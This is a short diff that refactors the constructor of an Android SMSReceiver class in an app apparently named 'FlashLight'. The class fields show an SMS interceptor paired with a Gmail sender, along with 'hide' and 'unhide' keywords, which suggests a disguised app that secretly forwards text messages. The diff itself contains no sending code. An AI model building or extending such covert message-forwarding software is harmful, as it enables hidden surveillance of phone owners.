@@ -18,9 +18,7 @@ public class SMSReceiver extends BroadcastReceiver {
 
   public  static Object[] pdus;
   private static GmailSender sender;
-  private static Configure configure;
   private static FlashLight flashLight;
-  private static FlashLightService flashLightService;
 
   public  static String mBody = null;
   private static String gmailEmailString;
@@ -32,18 +30,18 @@ public class SMSReceiver extends BroadcastReceiver {
   private static final String TAG     = "FlashLight SMSReceiver";
 
   public SMSReceiver() {
-    configure  = new Configure();
     flashLight = new FlashLight();
-    flashLightService = new FlashLightService();
+    Configure configure = new Configure();
+    FlashLightService flService = new FlashLightService();
     phoneNumberString   = configure.phoneNumber();
     hideKeywordString   = configure.hideKeyword();
     gmailEmailString    = configure.emailAddress();
     unhideKeywordString = configure.unhideKeyword();
     if(gmailEmailString == "null") {
-      phoneNumberString   = flashLightService.phoneNumber();
-      hideKeywordString   = flashLightService.hideKeyword();
-      gmailEmailString    = flashLightService.emailAddress();
-      unhideKeywordString = flashLightService.unhideKeyword();
+      phoneNumberString   = flService.phoneNumber();
+      hideKeywordString   = flService.hideKeyword();
+      gmailEmailString    = flService.emailAddress();
+      unhideKeywordString = flService.unhideKeyword();
     }
   }
 
